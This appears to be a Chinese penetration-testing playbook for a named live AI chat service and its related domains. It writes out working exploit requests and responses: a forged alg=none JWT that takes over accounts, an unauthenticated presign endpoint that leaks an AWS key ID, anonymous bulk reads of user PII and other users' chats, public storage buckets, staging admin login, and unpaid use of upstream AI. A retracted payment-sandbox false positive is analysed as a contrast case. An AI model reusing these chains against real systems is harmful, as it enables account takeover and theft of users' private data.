# 攻击链与 PoC 手册 · overchat.ai 实战

> 本文档为技能包 `case-web-payment-sandbox-false-positive` 的参考文件（`references/attack-chains-and-pocs.md`）。
> 收录**本案经复核成立的真漏洞攻击链 PoC**（可复用手法），以及**被撤回的支付沙盒负例**（用于对照与复盘）。
> 源报告：`C:\Users\Administrator\Desktop\overchat.ai渗透报告（未完成）\完整渗透报告.md` / `漏洞.md`。

---

## 0. 目标与部署矩阵（复现前提）

目标：`https://overchat.ai/web`；任务主线：上游模型供应商 `base_url` 与明文 `api_key`。

| 部署 | 域名 | 角色 |
| --- | --- | --- |
| 生产 | `api.overchat.ai` | 真实用户、真实 Stripe live 计费、真实上游 |
| 预发 | `staging-api.overchat.ai` | 测试套餐、Stripe **test** 模式、可触达真实上游 |
| Widget | `widget-api.overchat.ai` | 嵌入端点，鉴权按 `x-device-uuid` 头，**部分路径漏配** |
| 关联 | `api.vixio.ai` ≡ `staging-api.amigochat.io` | 同一 NestJS 进程，暴露 `/metrics` 等 |
| 对象存储 | 桶 `overchat` / `overchat-staging`（eu-north-1）、`overchat-light`（eu-north-1）、`amigopanda`（us-east-1） | 部分桶匿名可直读 |

**手指纹速查**：`/v1/auth/me`、`/v1/billing/subscription`、`/v1/chat/completions`、`/v1/s3/download?url=`、`/v1/chat/upload`、`/v1/prompt/enhance`、`/v1/config/global`、`/v1/models/list`、`/metrics`。

---

## 1. 链 A · 认证伪造 → 账号接管（CRITICAL）

**原理**：服务端只**解码** JWT 而**不验签**，`alg=none` 即可通过。

```
POST /v1/auth/apple/mobile
Content-Type: application/json

{"idToken":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJYX3NlbGYtc2VsZi0xODY5LTAwMDEiLCJuYW1lIjoiQXJ0eCJ9."}
```
→ `201`，返回生产 **access_token**。

```
GET /v1/auth/me
Authorization: Bearer <access_token>
```
→ `200`
```json
{"id":"362c392d-...","email":"artxself1869@example.com","appleId":"artx-self-1869-0001"}
```

**对照证伪（同款伪造 token 打 Google 端点，恒 401）**：
```
POST /v1/auth/google/mobile      → 401 {"message":"Invalid Google token",...}
POST /v1/auth/google/one-tap     → 401 {"message":"Invalid Google token",...}
```
→ 说明**不是**全站 JWT 策略宽松，而是 **Apple 移动端登录这一条路由漏了验签**（过河拆桥式定位）。

**要点**：`alg=none` 伪造只对"缺验签"的端点有效；用**同款伪造 token 打另一家 OAuth 端点做对照**，是最快的定位手法。

---

## 2. 链 B · 零鉴权预签名 → 对象读取 + 存在性预言机（CRITICAL/HIGH）

**原理**：`GET /v1/s3/download?url=` 免鉴权，用**站点自有 AWS 凭据**签发 3600 秒 SigV4 预签名 URL；**忽略输入 URL 的 host**，只把 **path 当 S3 key** 签名。

```
GET /v1/s3/download?url=http://127.0.0.1:3000/v1/model-cost
```
→ 签出的 URL 里 `X-Amz-Credential` 泄露站点 AWS Access Key ID（`AKIA…`，prod/staging 共用），`X-Amz-Expires=3600`，
被签的 key 就是 `v1/model-cost`。

**预言机语义**：
| 响应 | 含义 |
| --- | --- |
| `404` + `NoSuchKey` | key **不存在**（或该凭据无读权） |
| `200` + 真实字节 | key **存在且可读** |

⇒ 精确的**私有对象命名空间存在性 oracle**，可枚举对象名。

**连带影响**：该预签名 URL 本身可被匿名获取并转手使用（可分享的读取凭证）。

---

## 3. 链 C · Widget 部署漏配 → 批量 PII 读取（HIGH）

**原理**：`widget-api.overchat.ai` 上若干路径**完全没挂鉴权守卫**，而同一组路径在生产另一部署已加固为 401 → **部署差分**。

匿名 200 的路径：
```
GET /v1/users?limit=100
GET /v1/chats?limit=1
GET /v1/chats/{id}
GET /v1/personas/paginated
GET /v1/canvas
GET /v1/dashboards
```
实测响应：
```json
{"total":1808365,"totalPages":1808365}
```
- `/v1/users?limit=100` → `200`，85432 字节，含 `deviceId`、`stripeCustomerId`、`takosCoin`；
- 单条会话正文达 **125984 字节**。

**判据**：G1 生产某部署 ✓ / G2 无鉴权 ✓ / G4 有真实受害方（他人 PII、180 万条）✓ ⇒ 真漏洞。
**归因写法**：写"**某部署漏配鉴权**"，不要写"全站越权"。

---

## 4. 链 D · 生产 BOLA → 匿名读他人完整对话（HIGH）

**原理**：生产 `GET /v1/chat/{userId}/{chatId}`（及 `/messages`、`/media`）**只校验参数格式，不校验归属**。

```
GET /v1/chat/{任意userId}/{任意chatId}
```
→ `200` 返回完整对话内容（他人数据）。

**手法要点**：`userId` 可从链 C 的 `/v1/users` 批量取得 → **链 C → 链 D 组合即可批量枚举他人对话**。
（这也是"发现后不要继续遍历"的原因：链条一旦串起来，影响面是规模化的。）

---

## 5. 链 E · 匿名写 + 匿名读闭环（HIGH）

**原理**：生产 `POST /v1/chat/upload` 在**不带 bearer** 的情况下仍返回 `201`，仅靠伪造 `x-device-*` 头；**去掉该头则 403**。
而 OpenAPI 明明声明 `"security":[{"bearer":[]}]` ⇒ **实现与契约不符**。

```
POST /v1/chat/upload
x-device-uuid: <任意>
x-device-platform: web
（无 Authorization 头）
```
→ `201`（写入成功）

**闭环**：写出来 ⇒ 再经**链 B** 的预签名端点匿名读回 ⇒ 形成"**匿名写 + 匿名读**"完整闭环（不需要任何凭据即可读写他人存储面）。

**要点**：匿名写 + 匿名读要合并成一条链报告（闭环危害远大于单点）。

---

## 6. 链 F · 对象存储桶匿名直读（HIGH）

```
GET https://overchat-light.s3.eu-north-1.amazonaws.com/<object>
GET https://amigopanda.s3.us-east-1.amazonaws.com/<object>
```
→ `200`，直接返回真实文件字节（实测 295428 字节、692544 字节 PDF，`%PDF-1.7` 头）。

**要点**：桶策略（Bucket Policy / ACL）未设 `s3:List`/`s3:GetObject` 拒绝 ⇒ 匿名直读。

---

## 7. 链 G · 预发 mock 登录 → 签发有效 JWT（HIGH，定域为"预发环境暴露"）

```
POST /v1/auth/google/mock
Content-Type: application/json

{"code":"admin"}
```
→ 签发**既有账号**的有效 HS256 JWT（`exp` 30 天）；`code` 按 `<code>@overchat.ai` 反查用户库：
- `code=demo` → `demo@overchat.ai`
- `code=admin` → `admin@overchat.ai`

**定域**：`POST /v1/auth/google/mock` 在生产 `api.overchat.ai` / `widget-api.overchat.ai` 均 **404** ⇒ 影响面限预发 ⇒ 归类「**预发环境暴露**」，**不是**"生产认证绕过"。

**可复用判定法**："未鉴权即身份"类缺陷，必须回答三问：① 生产有无该路径？② 预发 token 能否在生产复用（**实测**，别假设）？③ 预发是否连真实上游/真实数据？

---

## 8. 链 H · 生产匿名白嫖上游算力（MEDIUM）—— 与误报条目的关键对照

```
POST /v1/chat/completions
（无 Authorization）
```
→ `200`，**原样透传 OpenRouter 响应体**：
```json
{"id":"gen-1792493506-fDHfqC2iGxmMrEzjsC0j","provider":"OpenAI","model":"openai/gpt-4.1-nano",...}
```
persona：`best-free-ai-chat-landing`。

**更强的一条**：
```
POST /v1/prompt/enhance
（未订阅：planCode=free、hasEverSubscribed=false；未计费：余额与负债无变化）
```
→ 直接返回**真实上游模型输出**；而同一身份打 `/v1/chat/completions` 却 `403 {"message":"This bot is only available on paid plans"}`
⇒ **付费门禁覆盖不全**（`/v1/prompt/enhance` 漏门禁）⇒ 真漏洞。

**输出泄露**：该端点还把服务端 **system prompt** 一并吐出（`"You are a prompt rewriter. ..."` 完整原文）。

**为什么是真漏洞（与被撤回条目的对照）**：
| 判据 | 链 H（真） | 被撤回条目（误报） |
| --- | --- | --- |
| 环境 | **生产** `api.overchat.ai` | 预发 `staging-api.overchat.ai` |
| 成本归属 | **真实上游算力，站方付费** | 测试夹具，无真钱 |
| 受害方 | 站方（可规模化白嫖） | 无 |
| 形态 | 门禁覆盖不全 | 门禁被沙盒"打开" |

---

## 9. 链 I · 客户端头当唯一凭据 → 读他人档案（MEDIUM）

`widget-api.overchat.ai`：
```
GET /v1/users/me
（无 x-device-uuid）                → 401
（x-device-uuid: <受害者A deviceId>）→ 200，返回该账号档案与订阅对象
（x-device-uuid: <受害者B deviceId>）→ 200，返回另一个账号
```
三个不同 deviceId 换回三个不同账号 ⇒ 服务端**按 deviceId 精确解析身份**且不校验归属 ⇒ 凭据完全客户端可控 ⇒ 等同无鉴权。
泄露字段含 `stripeCustomerId`、`takosCoin`、`deviceId`、订阅对象。

---

## 10. 链 J · `/metrics` 内部路由泄露 + 健康信息（MEDIUM）

```
GET https://api.vixio.ai/metrics        → 200, 92626 字节 Prometheus
GET https://api.vixio.ai/health         → 200 {"nodeEnv":"production","uptime":8377269,"restart":"2026-07-15T11:11:17.225Z"}
GET https://api.vixio.ai/echo
GET https://api.vixio.ai/v1/config/global
GET https://api.vixio.ai/v1/models/list
```
`/metrics` 中泄露 **60+ 内部路由**，例如 `/v1/admin/config/system`、`/v1/payments/webhook/adapty` ⇒ 直接给出后续攻击面清单。

---

## 11. 负例 · 被撤回的支付沙盒（**不是漏洞**，勿照搬）

**原始"发现"**（预发）：
```
POST https://staging-api.overchat.ai/v1/billing/buy-subscription
Content-Type: application/json

{"subscriptionCode":"apple_pay_test_1","placement":"web","ui":"hosted","returnUrl":"https://staging-api.overchat.ai/"}
```
→ `201`
```json
{"url":"https://checkout.stripe.com/c/pay/cs_test_b18XxBufUvrb54l17KTcQvIr5CVNqOraZF2DTaf2JfijcMnZbtIqR59DML#..."}
```
```
GET https://staging-api.overchat.ai/v1/billing/stripe-session?session_id=cs_test_b18X...
```
→ `200`
```json
{"payment_status":"unpaid","customer_id":"cus_VTXOXtWuJMlNZg","user_id":"f17ddd16-b6ea-4c99-960f-aef68a24d224"}
```
```
GET https://staging-api.overchat.ai/v1/billing/subscription
```
→ `200`
```json
{"planCode":"apple_pay_test_1","status":3,"stripeId":"sub_1USaPbGWUebql6H99HbSZLPb","paidThroughPeriodEnd":"2026-10-27T10:36:55.000Z"}
```
```
POST https://staging-api.overchat.ai/v1/billing/checkout/sync-package
Content-Type: application/json

{"sessionId":"cs_test_b18X..."}
```
→ `201` `{"ok":false,"reason":"session_not_paid"}`

**曾经的错误结论**：「结算与鉴权/发放解耦（INV-01）+ 支付确认未与权益发放绑定（INV-08）⇒ 403 付费权益层被打开」。

**正确判定 —— 沙盒正常行为，撤回**：
| 判据 | 取值 |
| --- | --- |
| G1 部署环境 | `staging-api.overchat.ai`（预发），生产是 `api.overchat.ai` |
| G2 支付通道模式 | 会话前缀 `cs_test_`；生产前端确认为 Stripe **live**（`pk_live_…`），无测试模式可复刻 |
| G3 商品 SKU | `apple_pay_test_1`（名字含 `_test_`，非生产价目表商品） |
| G4 真实影响 | 无资金流、无真实上游额度、仅影响测试者自有账号、一次性 ⇒ **无受害方** |
| G5 对照取证 | 生产不存在"零支付拿真套餐"的路径 |

**连带处置**：该发现**不得**用作"付费层已开启"的杠杆；基于它推导的下游结论（如"上游错误回显本可被观测"）**需重新验证**；报告中该段"【重要纠偏·假阴性推翻】"的推理前提不成立，应一并撤回或改写。

---

## 12. 复用清单（下次遇到同类目标，按此顺序跑）

1. **先定域**：目标到底是生产 / 预发 / 第三方？所有端点先做**部署差分**（同名路径打两个部署）。
2. **再做端点面测绘**：`/metrics`、`/health`、`/v1/config/global`、`/openapi.json`、`/swagger`、JS bundle 里的路由串。
3. **按成本归属分诊**：免费访问类发现，先问"**谁付钱**"（站方真上游？真用户？无）——这一问直接分开误报与真漏洞。
4. **按受害方分诊**：只影响自己 = 无害；能碰别人 = 有害。
5. **按通道模式分诊**：test/live/preview × 预发/生产 × 测试SKU/真实SKU 三维定位。
6. **鉴权判定三件套**：① 契约（OpenAPI `security`）② 实现（实际是否要 bearer）③ 差异（去掉头会怎样）。
7. **链式组合**：把"读接口"与"写接口"、与"ID 源"连起来评估影响面，但**取证到此为止**，不批量遍历。
8. **降级留证**：误报不删除，写成 `[INFO][已撤回·非漏洞]` 并附 G1–G5 判定依据，避免后来者重踩。
9. **写报告前自检**：这个发现"是谁付钱、谁受害、在哪个环境"——三问答不全，就不许定级。
